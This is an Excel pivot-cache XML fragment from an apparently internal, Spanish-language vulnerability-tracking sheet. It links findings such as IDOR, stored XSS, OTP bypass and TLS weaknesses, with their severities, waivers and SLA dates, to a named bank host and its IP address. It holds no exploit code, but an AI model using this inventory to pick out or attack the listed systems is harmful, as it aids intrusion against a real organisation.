        <s v="HTTP Strict Transport Security (HSTS)"/>
        <s v="Uso de librerías con vulnerabilidades conocidas"/>
        <s v="Recurso bloqueado por la política de seguridad de contenidos (CSP)"/>
        <s v="Se ha detectado una configuración incorrecta del CSP"/>
        <s v="Falta el atributo de integridad"/>
        <s v="Política potencialmente insegura: Cabeceras ineficaces: Content-Security-Policy"/>
        <s v="DNS Server Accessible"/>
        <s v="Spring Boot Misconfiguration"/>
        <s v="El sitio emite registros visibles del navegador"/>
        <s v="El sitio no carga los componentes de la página"/>
        <s v="Sensitive Files Disclosure"/>
        <s v="Referencias Inseguras a Objetos de manera Directa (IDOR)"/>
        <s v="Filtración de contraseña de usuario logado por fallo en BBDD"/>
        <s v="Acceso no autorizado"/>
        <s v="Interacción con servicios externos (DNS)"/>
        <s v="Test Eicar de subida de ficheros fallido"/>
        <s v="Activo vulnerable a Lucky13"/>
        <s v="Fuga de información en cabeceras"/>
        <s v="Autocompletado en formularios"/>
        <s v="Renegociación insegura del handshake en SSL/TLS iniciada por el cliente"/>
        <s v="Configuración incorrecta de cabecera Content-Security-Policy"/>
        <s v="Revelación de información a través de SSL/TLS (BREACH)"/>
        <s v="Revelación de información a través de SSL/TLS (LUCKY13 CVE-2013-0169)"/>
        <s v="Fuga de información de direcciones IP internas"/>
        <s v="Cabeceras Pragma HTTP y Cache-control incompletas o no habilitadas"/>
        <s v="Site emits visible browser logs"/>
        <s v="Site fails to load page components"/>
        <s v="Ausencia de cabecera Content-Security-Policy"/>
        <s v="Generación insegura de UUIDs para cookies"/>
        <s v="Renegociación segura por RFC 5746 no soportada"/>
        <s v="Código fuente de la aplicación no ofuscado (Android)"/>
        <s v="Ausencia o mala implementación de mecanismos de prevención contra ataques automatizados"/>
        <s v="Directory Listing"/>
        <s v="Vulnerable JavaScript Library Detected - Bootstrap"/>
        <s v="Web Directories Listable Vulnerability"/>
        <s v="SSL Certificate - Expired"/>
        <s v="SSL Certificate - Signature Verification Failed Vulnerability"/>
        <s v="Se detectó una configuración de CSP insegura."/>
        <s v="Inadecuada configuración de la cabecera HTTP Strict Transport Security (HSTS)"/>
        <s v="Recurso bloqueado por la Política de Seguridad de Contenido (CSP)"/>
        <s v="Librería jQuery con vulnerabilidades asociadas"/>
        <s v="Librería Bootstrap con vulnerabilidades asociadas"/>
        <s v="Revelación de información interna en metadatos de documentos"/>
        <s v="Fuga de información de servidores internos"/>
        <s v="CSP Violations"/>
        <s v="CSP Configurations"/>
        <s v="Insecure Transport"/>
        <s v="Denegación de Servicio "/>
        <s v="Información en metadatos"/>
        <s v="Ausencia de cabecera X-Frame-Options"/>
        <s v="Ausencia de cabecera X-Content-Options"/>
        <s v="Ataque de temporización del cálculo de MAC de TLS (LUCKY13)"/>
        <s v="Ausencia de cabecera Referrer-Policy"/>
        <s v="Ausencia de cabecera Cross-Origin-Embedder-Policy"/>
        <s v="Ausencia de cabecera Cross-Origin-Resource-Policy"/>
        <s v="Ausencia de cabecera Cross-Origin-Opener-Policy"/>
        <s v="Ausencia de cabecera Permissions-Policy"/>
        <s v="Ausencia de cabecera Strict-Transport-Security (HTST)"/>
        <s v="Evasión del control de detección de dispositivo Rooteado"/>
        <s v="Evasión del control de Certificate Pinning "/>
        <s v="Información sensible en archivos de log"/>
        <s v="Credenciales en código fuente"/>
        <s v="Fuga de información de servidor  y versión"/>
        <s v="Cabecera Content-Security-Policy con configuraciones inseguras"/>
        <s v="Falta de cabecera HTTP Strict Transport Security (HSTS)"/>
        <s v="Métodos HTTP inseguros habilitados en el servidor"/>
        <s v="Ausencia de protección contra Clickjacking"/>
        <s v="Web Server HTTP Trace/Track Method Support Cross-Site Tracing Vulnerability"/>
        <s v="HTTP TRACE / TRACK Methods Enabled"/>
        <s v="An insecure CSP configuration was detected."/>
        <s v="Evasión de la lógica de negocio"/>
        <s v="JWT token in Authorization header uses symmetric algorithm."/>
        <s v="Evasión de firma de peticiones"/>
        <s v="Ausencia de control de automatizaciones"/>
        <s v="Abuso por repetición de código OTP expuesto en parámetro GET"/>
        <s v="Información acerca de las tecnologías en las cabeceras de respuesta"/>
        <s v="Información sensible en metadatos"/>
        <s v="acceso a información de Firewall"/>
        <s v="fuga de información de Software y versiones vulnerables a exploits críticos"/>
        <s v="Fuga de información de Software y versiones desactualizadas"/>
        <s v="Resolución DNS Externa mediante Cabecera Host"/>
        <m/>
        <s v="Envío de Información sensible en URL"/>
        <s v="Ausencia de cabeceras"/>
        <s v="Fallo en identificada en la validación del PIN"/>
        <s v="Denegación de servicio por bloqueo de cuenta"/>
        <s v="Acceso No Autorizado a Información restringida"/>
        <s v="Fuga de software y versión en errores no controlados"/>
        <s v="Acceso no autorizado a operativas"/>
        <s v="JWT token in Response Headers uses symmetric algorithm."/>
        <s v="Ausencia de mecanismo anti automatización"/>
        <s v="Cross Site Scripting Almacenado"/>
        <s v="Ausencia de controles anti-automatización"/>
        <s v="Fuga de información de uso de la tecnología ASP.NET"/>
        <s v="Autocompletado de formularios habilitado"/>
        <s v="TCP Source Port Pass Firewall"/>
        <s v="Secure Sockets Layer/Transport Layer Security (SSL/TLS) Server supports Transport Layer Security (TLSv1.0)"/>
        <s v="Fuga de información de aplicación y versión "/>
        <s v="Acceso a información sensible de clientes sin autenticación"/>
        <s v="Referencia Directa a Objeto Insegura (IDOR)"/>
        <s v="Credenciales de Keystore embebidas en el código fuente de la aplicación"/>
        <s v="Implementación insegura de Certificate Pinning _x000a_(SSL/TLS)"/>
        <s v="Evasión de Detección de Root"/>
        <s v="Soporte para Versiones de Android Desactualizadas "/>
        <s v="Detectado tipo y versión del servidor de la aplicación"/>
        <s v="Protección de fichero deficiente "/>
        <s v="Exposición de Documentación de API"/>
        <s v="Exposición de información a través del endpoint /info de Spring Boot Actuator"/>
      </sharedItems>
    </cacheField>
    <cacheField name="CWE Category" numFmtId="0">
      <sharedItems containsBlank="1"/>
    </cacheField>
    <cacheField name="State" numFmtId="0">
      <sharedItems/>
    </cacheField>
    <cacheField name="Criticity" numFmtId="0">
      <sharedItems count="7">
        <s v="Critical"/>
        <s v="Medium"/>
        <s v="Low"/>
        <s v="Fair"/>
        <s v="High"/>
        <s v="Neutral"/>
        <s v="Warn"/>
      </sharedItems>
    </cacheField>
    <cacheField name="CVSS / Vendor Severity" numFmtId="0">
      <sharedItems containsBlank="1" containsMixedTypes="1" containsNumber="1" minValue="1.6" maxValue="10"/>
    </cacheField>
    <cacheField name="Code CVE_x000a_(Common Vulnerabilities and Exposures)" numFmtId="0">
      <sharedItems containsBlank="1"/>
    </cacheField>
    <cacheField name="IP" numFmtId="0">
      <sharedItems containsBlank="1" containsMixedTypes="1" containsNumber="1" containsInteger="1" minValue="94188208248" maxValue="190242107210"/>
    </cacheField>
    <cacheField name="Hostname" numFmtId="0">
      <sharedItems containsBlank="1" longText="1"/>
    </cacheField>
    <cacheField name="Port" numFmtId="0">
      <sharedItems containsBlank="1" containsMixedTypes="1" containsNumber="1" containsInteger="1" minValue="22" maxValue="500"/>
    </cacheField>
    <cacheField name="Port Type" numFmtId="0">
      <sharedItems containsBlank="1" containsMixedTypes="1" containsNumber="1" containsInteger="1" minValue="500" maxValue="500"/>
    </cacheField>
    <cacheField name="Reported Date" numFmtId="0">
      <sharedItems containsNonDate="0" containsDate="1" containsString="0" containsBlank="1" minDate="2013-11-20T00:00:00" maxDate="2026-05-01T00:00:00"/>
    </cacheField>
    <cacheField name="Days that reported" numFmtId="0">
      <sharedItems containsString="0" containsBlank="1" containsNumber="1" minValue="54" maxValue="46196"/>
    </cacheField>
    <cacheField name="Expiration day according to SLA" numFmtId="14">
      <sharedItems containsDate="1" containsMixedTypes="1" minDate="1900-03-30T00:00:00" maxDate="2026-08-29T00:00:00"/>
    </cacheField>
    <cacheField name="SLA State" numFmtId="1">
      <sharedItems count="3">
        <s v="SLA Vencido"/>
        <s v="Error"/>
        <s v="En SLA"/>
      </sharedItems>
    </cacheField>
    <cacheField name="Waiver" numFmtId="0">
      <sharedItems containsBlank="1"/>
    </cacheField>
    <cacheField name="Date of application for Waiver" numFmtId="0">
      <sharedItems containsBlank="1"/>
    </cacheField>
    <cacheField name="End date of Waiver" numFmtId="0">
      <sharedItems containsBlank="1"/>
    </cacheField>
    <cacheField name="Remediation Date" numFmtId="0">
      <sharedItems containsDate="1" containsBlank="1" containsMixedTypes="1" minDate="2020-03-01T00:00:00" maxDate="2025-05-01T00:00:00"/>
    </cacheField>
    <cacheField name="Details" numFmtId="0">
      <sharedItems containsBlank="1" longText="1"/>
    </cacheField>
    <cacheField name="Recommendation" numFmtId="0">
      <sharedItems containsBlank="1" longText="1"/>
    </cacheField>
    <cacheField name="Risks Derived" numFmtId="0">
      <sharedItems containsBlank="1" longText="1"/>
    </cacheField>
    <cacheField name="Date of attention" numFmtId="0">
      <sharedItems containsDate="1" containsBlank="1" containsMixedTypes="1" minDate="2020-06-30T00:00:00" maxDate="2026-02-28T00:00:00"/>
    </cacheField>
    <cacheField name="Commentary" numFmtId="0">
      <sharedItems containsBlank="1" longText="1"/>
    </cacheField>
    <cacheField name="Own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ilera Gonzalez Santiago" refreshedDate="46196.683691087965" createdVersion="8" refreshedVersion="8" minRefreshableVersion="3" recordCount="352" xr:uid="{BFB94CEE-3F00-41F0-B461-FC55EFB0DFE8}">
  <cacheSource type="worksheet">
    <worksheetSource ref="A1:AG353" sheet="SF"/>
  </cacheSource>
  <cacheFields count="33">
    <cacheField name="#" numFmtId="0">
      <sharedItems containsSemiMixedTypes="0" containsString="0" containsNumber="1" containsInteger="1" minValue="1" maxValue="348"/>
    </cacheField>
    <cacheField name="Company" numFmtId="0">
      <sharedItems/>
    </cacheField>
    <cacheField name="Source" numFmtId="0">
      <sharedItems containsBlank="1"/>
    </cacheField>
    <cacheField name="Type" numFmtId="0">
      <sharedItems containsBlank="1"/>
    </cacheField>
    <cacheField name="Waiver Code" numFmtId="0">
      <sharedItems containsNonDate="0" containsString="0" containsBlank="1"/>
    </cacheField>
    <cacheField name="Previous Waiver code" numFmtId="0">
      <sharedItems containsNonDate="0" containsString="0" containsBlank="1"/>
    </cacheField>
    <cacheField name="Name of vulnerable asset" numFmtId="0">
      <sharedItems containsBlank="1"/>
    </cacheField>
    <cacheField name="Internal Identification Code" numFmtId="0">
      <sharedItems containsBlank="1" containsMixedTypes="1" containsNumber="1" containsInteger="1" minValue="0" maxValue="0"/>
    </cacheField>
    <cacheField name="Identification Code External" numFmtId="0">
      <sharedItems containsBlank="1"/>
    </cacheField>
    <cacheField name="Vulnerability description" numFmtId="0">
      <sharedItems containsBlank="1" count="150" longText="1">
        <s v="Microsoft IIS Tilde Character Information Disclosure Vulnerability"/>
        <s v="Predictable Resource Location Via Forced Browsing"/>
        <s v="Clickjacking - Framable Page"/>
        <s v="Web Server HTTP Trace/Track Method Support Cross-Site Tracing Vulnerability"/>
        <s v="HTTP TRACE / TRACK Methods Enabled"/>
        <s v="Web Directories Listable Vulnerability"/>
        <s v="HTTP Security Header Not Detected"/>
        <s v="Uso de Software desactualizado"/>
        <s v="Test EICAR de subida de ficheros fallido"/>
        <s v="Cookies sin atributo HttpOnly"/>
        <s v="Fuga de información de servidor y versión"/>
        <s v="Uso de software vulnerable"/>
        <s v="Fichero wp-cron.php expuesto"/>
        <s v="Acceso a ficheros Log del servidor"/>
        <s v="Acceso a páginas no enlazadas"/>
        <s v="Enumeración de usuarios"/>
        <s v="Certificado SSL caducado"/>
        <s v="Acceso a páginas por defecto"/>
        <s v="Fuga de información de rutas internas"/>
        <s v="CAPTCHA BYPASS: Rate Limiting Bypass on Contact Page"/>
        <s v="Username enumeration in login functionality"/>
        <s v="Cookie no protegida por el atributo HttpOnly"/>
        <s v="TLS MAC calculation timing attack (LUCKY13)"/>
        <s v="Método HTTP TRACE habilitado"/>
        <s v="Listado de directorios"/>
        <s v="Revelación de información a través de SSL/TLS (LUCKY13 CVE-2013-0169)"/>
        <s v="Cookie sin atributo Secure"/>
        <s v="Lucky13"/>
        <s v="Renegociación insegura del handshake en SSL/TLS iniciada por el cliente"/>
        <s v="Revelación de información a través de SSL/TLS (BEAST)"/>
        <s v="Ausencia de protección contra Clickjacking"/>
        <s v="Fuga de información de servidor"/>
        <s v="Métodos HTTP inseguros habilitados en el servidor"/>
        <s v="Inadecuada política de contraseñas"/>
        <s v="Revelación de información a través de SSL/TLS (BREACH)"/>
        <s v="Cifrado SSL inseguro"/>
        <s v="Padding Oracle On Downgraded Legacy Encryption (POODLE)"/>
        <s v="Revelación de información interna en metadatos de documentos"/>
        <s v="Interacción con servicios externos (DNS)"/>
        <s v="Exposición de ficheros en el directorio cgi-bin"/>
        <s v="Cookies sin atributo secure"/>
        <s v="Exposición de información sensible mediante encabezados"/>
        <s v="Detección de algoritmos de cifrado en bloques CBC"/>
        <s v="Exposición de información sensible"/>
        <s v="Parametrización incorrecta de cabeceras HTTP"/>
        <s v="Fuga de información de aplicación y versión"/>
        <s v="Cabecera Content-Security-Policy mal configurada"/>
        <s v="Ausencia de cabecera Content-Security-Policy"/>
        <s v="Ausencia de cabecera Content-Security-Policy o mal configurada"/>
        <s v="Cookie sin atributo HttpOnly"/>
        <s v="Uso de librerías con vulnerabilidades conocidas"/>
        <s v="Cabecera Content-Security-Policy incorrectamente configurada"/>
        <s v="Se detectó una configuración de CSP incorrecta."/>
        <s v="Uso de una o más bibliotecas de JavaScript con vulnerabilidades conocidas"/>
        <s v="Recurso bloqueado por la Política de Seguridad de Contenido (CSP)"/>
        <s v="El tamaño de la clave pública es inferior a 2048 bits"/>
        <s v="Política potencialmente insegura_x000a_Encabezados ineficaces: Content-Security-Policy"/>
        <s v="Atributo de integridad faltante"/>
        <s v="Certificate Is Revoked"/>
        <s v="Evasión de mecanismo anti-automatización"/>
        <s v="Ausencia de mecanismos de prevención contra ataques de fuerza bruta"/>
        <s v="Múltiples sesiones simultáneas desde IPs y dispositivos distintos"/>
        <s v="Enumeración de directorios"/>
        <s v="Ausencia de cabecera Permission-Policy"/>
        <s v="Ausencia de cabecera Cross-Origin-Embedder-Policy"/>
        <s v="Ausencia de cabecera Cross-Origin-Resource-Policy"/>
        <s v="Ausencia de cabecera Cross-Origin-Opener-Policy"/>
        <s v="Ausencia de cabecera X-Frame-Options"/>
        <s v="Ausencia de cabecera X-Content-Type-Options"/>
        <s v="Ausencia de cabecera Referrer-Policy"/>
        <s v="Metadatos en documentos"/>
        <s v="Uso de software vulnerable JBoss Richfaces"/>
        <s v="Incorrecta gestión de errores"/>
        <s v="Fijación de sesión"/>
        <s v="Comunicaciones no cifradas"/>
        <s v="Cookie de sesión sin atributo HttpOnly"/>
        <s v="Exposición de código fuente XHTML"/>
        <s v="Subida de ficheros Offices con Macros"/>
        <s v="Cookie de sesión sin atributo Secure"/>
        <s v="Autocompletado en formularios"/>
        <s v="Cross-site scripting almacenado"/>
        <s v="Uso de Autenticación Básica con método GET"/>
        <s v="Evasión de la lógica de negocio"/>
        <s v="Directory Listing"/>
        <s v="Remote Management Service Accepting Unencrypted Credentials Detected (FTP)"/>
        <s v="ISC BIND Depletion of CPU Resources Vulnerability (CVE-2024-1975)"/>
        <s v="ISC BIND Slow Processing of Database Queries Vulnerability (CVE-2024-1737)"/>
        <s v="SSL Certificate - Expired"/>
        <s v="SSL Certificate - Signature Verification Failed Vulnerability"/>
        <s v="SSL Server Has SSLv3 Enabled Vulnerability"/>
        <s v="Secure Sockets Layer/Transport Layer Security (SSL/TLS) Server supports Transport Layer Security (TLSv1.0)"/>
        <s v="Expose_php Set to On in php.ini"/>
        <s v="Insecure Transport"/>
        <s v="SSL Certificate - Improper Usage Vulnerability"/>
        <s v="Cookie Does Not Contain The &quot;secure&quot; Attribute"/>
        <s v="Certificate Is Expired"/>
        <s v="Public key size is less than 2048 bits"/>
        <s v="Uso de versiones de software vulnerables"/>
        <s v="Subida de ficheros arbitrarios"/>
        <s v="Sensitive Files Disclosure"/>
        <s v="TCP Source Port Pass Firewall"/>
        <s v="Vulnerable JavaScript Library Detected - Bootstrap"/>
        <s v="Cookies de sesión sin atributo Secure"/>
        <s v="Almacenamiento de credenciales en texto claro o con cifrado reversible"/>
        <s v="Acceso a datos/operativas sensibles sin doble factor de autenticación"/>
        <s v="Divulgación de información sensible en JSON Web Token"/>
        <s v="Posibilidad de realizar ataques de fuerza bruta"/>
        <s v="Referencias Inseguras a Objetos de manera Directa (IDOR)"/>
        <s v="Servicio expuesto no recomendado (SMBv2 exploit)"/>
        <s v="Enumeración de directorios (wp-content y wp-includes)"/>
        <s v="Cookie Does Not Contain The &quot;HTTPOnly&quot; Attribute"/>
        <s v="The cookie does not contain the &amp;quot;HTTPOnly&amp;quot; attribute."/>
        <s v="The cookie does not contain the &amp;quot;secure&amp;quot; attribute."/>
        <s v="The Web server presents a directory listing."/>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A potentially sensitive file, directory, or directory listing was discovered on the Web server."/>
        <s v="Información sensible en metadatos"/>
        <s v="Información acerca de las tecnologías en las cabeceras de respuesta"/>
        <s v="nteracción con servicios externos (DNS)"/>
        <s v="(Potencial) Referencias Inseguras a Objetos de manera Directa (IDOR)"/>
        <s v="(Potencial) Cross Site Scripting Almacenado"/>
        <m/>
        <s v="Fuga de información de aplicación y versión "/>
        <s v="Revelación de información a través de SSL/TLS _x000a_(BREACH)"/>
        <s v="Evasión del proceso de firma con clave de operaciones o segundo factor de autenticación"/>
        <s v="Revelación de información a través de SSL/TLS (LUCKY13 CVE_x0002_2013-0169)"/>
        <s v="Potentially insecure policy; Ineffective headers"/>
        <s v="CSP Configurations"/>
        <s v="Cross domain subresource integrity check"/>
        <s v="CSP Violations"/>
        <s v="Potentially insecure policy; Ineffective header"/>
        <s v="Errores no controlados por la aplicación"/>
        <s v="Inyección HTML"/>
        <s v="Cross Site Scripting Basado en DOM"/>
        <s v="Cabeceras Pragma HTTP y Cache-control incompletas o no habilitadas"/>
        <s v="A link is accessible over an insecure connection, i.e. HTTP."/>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s v="Cookie de sesión transmitida sin el atributo Secure establecido"/>
        <s v="Enumeración de usuarios a través del formulario de recuperación de contraseña"/>
        <s v="Ausencia de la cabecera HTTP X-Content-Type-Options"/>
        <s v="Bypass del segundo factor de autenticación por manipulación del parámetro de envío del OTP"/>
        <s v="Exposición de credenciales OAuth de Keycloak en el frontend"/>
        <s v="Ausencia de limitación de frecuencia en generación de códigos OTP"/>
        <s v="Envío de Información sensible en URL"/>
        <s v="Subida de ficheros maliciosos"/>
        <s v="Acceso a datos confidenciales en almacenamiento local"/>
        <s v="Uso de Autenticación Básica en aplicativo web"/>
        <s v="Ausencia de controles anti-automatización"/>
        <s v="Open Secure Sockets Layer (OpenSSL) Security Vulnerabilities (CVE-2026-28388,CVE-2026-28389,CVE-2026-28390) (Unauthenticated Detection)"/>
        <s v="Ficheros de configuración expuestos de manera pública"/>
      </sharedItems>
    </cacheField>
    <cacheField name="CWE Category" numFmtId="0">
      <sharedItems containsNonDate="0" containsString="0" containsBlank="1"/>
    </cacheField>
    <cacheField name="State" numFmtId="0">
      <sharedItems containsBlank="1" count="4">
        <s v="Dismissed"/>
        <s v="Solved"/>
        <s v="Active"/>
        <m/>
      </sharedItems>
    </cacheField>
    <cacheField name="Criticity" numFmtId="0">
      <sharedItems containsBlank="1"/>
    </cacheField>
    <cacheField name="CVSS / Vendor Severity" numFmtId="0">
      <sharedItems containsBlank="1" containsMixedTypes="1" containsNumber="1" minValue="1" maxValue="10"/>
    </cacheField>
    <cacheField name="Code CVE_x000a_(Common Vulnerabilities and Exposures)" numFmtId="0">
      <sharedItems containsBlank="1"/>
    </cacheField>
    <cacheField name="IP" numFmtId="0">
      <sharedItems containsNonDate="0" containsString="0" containsBlank="1"/>
    </cacheField>
    <cacheField name="Hostname" numFmtId="0">
      <sharedItems containsBlank="1" longText="1"/>
    </cacheField>
    <cacheField name="Port" numFmtId="0">
      <sharedItems containsBlank="1" containsMixedTypes="1" containsNumber="1" containsInteger="1" minValue="21" maxValue="11444"/>
    </cacheField>
    <cacheField name="Port Type" numFmtId="0">
      <sharedItems containsNonDate="0" containsString="0" containsBlank="1"/>
    </cacheField>
    <cacheField name="Reported Date" numFmtId="0">
      <sharedItems containsDate="1" containsString="0" containsBlank="1" containsMixedTypes="1" minDate="2021-01-26T00:00:00" maxDate="6679-02-27T02:51:04"/>
    </cacheField>
    <cacheField name="Days that reported" numFmtId="0">
      <sharedItems containsString="0" containsBlank="1" containsNumber="1" minValue="34" maxValue="1974"/>
    </cacheField>
    <cacheField name="Expiration day according to SLA" numFmtId="14">
      <sharedItems containsNonDate="0" containsDate="1" containsString="0" containsBlank="1" minDate="2021-04-26T00:00:00" maxDate="2026-09-18T00:00:00"/>
    </cacheField>
    <cacheField name="SLA State" numFmtId="0">
      <sharedItems containsBlank="1" count="3">
        <s v="SLA Vencido"/>
        <s v="En SLA"/>
        <m/>
      </sharedItems>
    </cacheField>
    <cacheField name="Waiver" numFmtId="0">
      <sharedItems containsNonDate="0" containsString="0" containsBlank="1"/>
    </cacheField>
    <cacheField name="Date of application for Waiver" numFmtId="0">
      <sharedItems containsNonDate="0" containsString="0" containsBlank="1"/>
    </cacheField>
    <cacheField name="End date of Waiver" numFmtId="0">
      <sharedItems containsNonDate="0" containsString="0" containsBlank="1"/>
    </cacheField>
    <cacheField name="Remediation Date" numFmtId="0">
      <sharedItems containsNonDate="0" containsDate="1" containsString="0" containsBlank="1" minDate="2024-03-20T00:00:00" maxDate="2025-04-10T00:00:00"/>
    </cacheField>
    <cacheField name="Details" numFmtId="0">
      <sharedItems containsBlank="1" longText="1"/>
    </cacheField>
    <cacheField name="Recommendation" numFmtId="0">
      <sharedItems containsBlank="1" longText="1"/>
    </cacheField>
    <cacheField name="Risks Derived" numFmtId="0">
      <sharedItems containsBlank="1" longText="1"/>
    </cacheField>
    <cacheField name="Date of attention" numFmtId="0">
      <sharedItems containsDate="1" containsBlank="1" containsMixedTypes="1" minDate="2025-09-19T00:00:00" maxDate="2025-10-24T00:00:00"/>
    </cacheField>
    <cacheField name="Commentary" numFmtId="0">
      <sharedItems containsBlank="1" longText="1"/>
    </cacheField>
    <cacheField name="Own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0">
  <r>
    <n v="1"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <s v="BSNC-2019-021"/>
    <s v="BSNC-2019-005_x000a_BSNC-2019-007"/>
    <s v="Web de Proveedores"/>
    <s v="MAN-b00ec668"/>
    <s v="CO-001-003"/>
    <x v="0"/>
    <m/>
    <s v="Dismissed"/>
    <x v="0"/>
    <n v="7.6999998092651367"/>
    <m/>
    <s v="170.169.33.48"/>
    <s v="confirming.santander.com.co"/>
    <n v="443"/>
    <m/>
    <d v="2017-07-25T00:00:00"/>
    <n v="3255"/>
    <d v="2017-08-04T00:00:00"/>
    <x v="0"/>
    <s v="Waiver"/>
    <s v="1ª Fecha: 25/07/2017_x000a_2ª Fecha: 31/07/2019_x000a_3ª Fecha: 21/12/2019_x000a_4ª Fecha: 13/04/2020"/>
    <s v="1ª Fecha: 31/07/2019_x000a_2ª Fecha: 29/11/2019_x000a_3ª Fecha: 30/04/2020_x000a_4ª Fecha: 30/06/2020"/>
    <d v="2020-07-13T00:00:00"/>
    <m/>
    <m/>
    <s v="Un directorio transversal (o path traversal) consiste en explotar una vulnerabilidad informática que ocurre cuando no existe suficiente seguridad en cuanto a la validación de un usuario, permitiéndole acceder a cualquier tipo de directorio superior (padre) sin ningún control."/>
    <d v="2020-06-30T00:00:00"/>
    <s v="Fue dado de baja el Lunes 13 de Julio del 2020"/>
    <m/>
  </r>
  <r>
    <n v="2"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <s v="BSNC-2019-022"/>
    <s v="BSNC-2019-008"/>
    <s v="Web de Proveedores"/>
    <s v="MAN-b00ec669"/>
    <s v="CO-005-002"/>
    <x v="1"/>
    <m/>
    <s v="Dismissed"/>
    <x v="0"/>
    <n v="7.5999999046325684"/>
    <m/>
    <s v="170.169.33.48"/>
    <s v="confirming.santander.com.co"/>
    <n v="443"/>
    <m/>
    <d v="2017-07-25T00:00:00"/>
    <n v="3255"/>
    <d v="2017-08-04T00:00:00"/>
    <x v="0"/>
    <s v="Waiver"/>
    <s v="1ª Fecha: 23/07/2019_x000a_2ª Fecha: 21/12/2019_x000a_3ª Fecha: 13/04/2020"/>
    <s v="1ª Fecha: 29/11/2019_x000a_2ª Fecha: 30/04/2020_x000a_3ª Fecha: 30/06/2020"/>
    <d v="2020-07-13T00:00:00"/>
    <m/>
    <m/>
    <s v="Los ataques de tipo &quot;Cross-site Request Forgery&quot; fuerzan a un usuario a realizar acciones no deseadas en aplicativos web, aprovechando que los usuarios legítimos se encuentran previamente autenticados en la plataforma. De esta manera, un atacante malintencionado podría confeccionar peticiones HTTP que realizasen alguna acción concreta de la aplicación, por ejemplo, cambiar la contraseña del usuario legítimo, hacer una transacción bancaria, etc. Una vez confeccionadas estas peticiones se forzaría al usuario a realizarlas, en este paso interviene un componente de ingeniería social, ya que se ha de hacer llegar al usuario un link con la acción confeccionada por el atacante para que el usuario la ejecute. Por ejemplo, simular una campaña de publicidad de la compañía via e-mail con un enlace a la acción confeccionada por el atacante. Por otro lado, para camuflar el enlace se puede esconder el mismo modificando el texto del hipervínculo, el típico &quot;pulse aquí&quot; o, incluso, utilizar acortadores de URL. De esta manera, cuando el usuario acceda al enlace enviado por correo electrónico se intentará ejecutar la acción deseada dentro de la sesión del usuario en la aplicación, sin que éste se de cuenta. En numerosas ocasiones, si el usuario no se encuentra previamente autenticado, al intentar realizar una acción privilegiada como cambiar la contraseña, el propio aplicativo web presentará al usuario el formulario de inicio de sesión para que éste se autentique y posteriormente realizar la acción diseñada por el atacante."/>
    <d v="2020-06-30T00:00:00"/>
    <s v="Fue dado de baja el Lunes 13 de Julio del 2020"/>
    <m/>
  </r>
  <r>
    <n v="3"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <s v="BSNC-2019-013"/>
    <m/>
    <s v="Web de Proveedores"/>
    <s v="MAN-28ad454c"/>
    <s v="CO-017-002"/>
    <x v="2"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <n v="6.5"/>
    <m/>
    <s v="170.169.33.48"/>
    <s v="confirming.santander.com.co"/>
    <n v="443"/>
    <m/>
    <d v="2017-01-11T00:00:00"/>
    <n v="3450"/>
    <d v="2017-04-11T00:00:00"/>
    <x v="0"/>
    <s v="Waiver"/>
    <s v="1ª Fecha: 21/12/2019_x000a_2ª Fecha: 13/04/2020"/>
    <s v="1ª Fecha: 30/04/2020_x000a_2ª Fecha: 30/06/2020"/>
    <d v="2020-07-13T00:00:00"/>
    <m/>
    <m/>
    <s v="Ataque de fuerza bruta"/>
    <d v="2020-06-30T00:00:00"/>
    <s v="Fue dado de baja el Lunes 13 de Julio del 2020"/>
    <m/>
  </r>
  <r>
    <n v="4"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <s v="BSNC-2019-023"/>
    <m/>
    <s v="Web de Proveedores"/>
    <s v="MAN-18af2324"/>
    <s v="CO-19-AUTO-02-CO-001"/>
    <x v="3"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <n v="5.5999999046325684"/>
    <m/>
    <s v="170.169.33.48"/>
    <s v="confirming.santander.com.co"/>
    <n v="443"/>
    <m/>
    <d v="2019-09-11T00:00:00"/>
    <n v="2477"/>
    <d v="2019-12-10T00:00:00"/>
    <x v="0"/>
    <s v="Waiver"/>
    <s v="1ª Fecha: 21/12/2019_x000a_2ª Fecha: 13/04/2020"/>
    <s v="1ª Fecha: 30/04/2020_x000a_2ª Fecha: 30/06/2020"/>
    <d v="2020-07-13T00:00:00"/>
    <s v="Se encuentra el uso de funciones de Modernizr 2.6.2:_x000a_/WebProveedoresNala/proveedores/js/vendor/modernizr-2.6.2.min.js"/>
    <s v="Se recomienda utilizar versiones actualizadas del software y/o plataformas tecnológicas utilizadas, en caso de no ser posible aplicar todas las actualizaciones de seguridad publicadas para la versión utilizada."/>
    <s v="El software o plataforma utilizada no se encuentra actualizado a la última versión disponible. Esto implica que podría ser susceptible de poder ser comprometido mediante vulnerabilidades conocidas que pudieran poner en riesgo el activo afectado."/>
    <d v="2020-06-30T00:00:00"/>
    <s v="Fue dado de baja el Lunes 13 de Julio del 2020"/>
    <m/>
  </r>
  <r>
    <n v="5"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <s v="BSNC-2019-014"/>
    <m/>
    <s v="Web de Proveedores"/>
    <s v="MAN-28ad454d"/>
    <s v="CO-037-001"/>
    <x v="4"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <n v="5.3000001907348633"/>
    <m/>
    <s v="170.169.33.48"/>
    <s v="confirming.santander.com.co"/>
    <n v="443"/>
    <m/>
    <d v="2017-05-24T00:00:00"/>
    <n v="3317"/>
    <d v="2017-08-22T00:00:00"/>
    <x v="0"/>
    <s v="Waiver"/>
    <s v="1ª Fecha: 21/12/2019_x000a_2ª Fecha: 13/04/2020"/>
    <s v="1ª Fecha: 30/04/2020_x000a_2ª Fecha: 30/06/2020"/>
    <d v="2020-07-13T00:00:00"/>
    <m/>
    <m/>
    <s v="Existe un fallo de diseño en los protocolos SSL 3.0 y TLS 1.0 al utilizar cifrado de bloque en modo CBC. Esto podría ser utilizado por un atacante remoto para revelar información sensible a través de ataques Man in The Middle."/>
    <d v="2020-06-30T00:00:00"/>
    <s v="Fue dado de baja el Lunes 13 de Julio del 2020"/>
    <m/>
  </r>
  <r>
    <n v="6"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <s v="BSNC-2019-012"/>
    <m/>
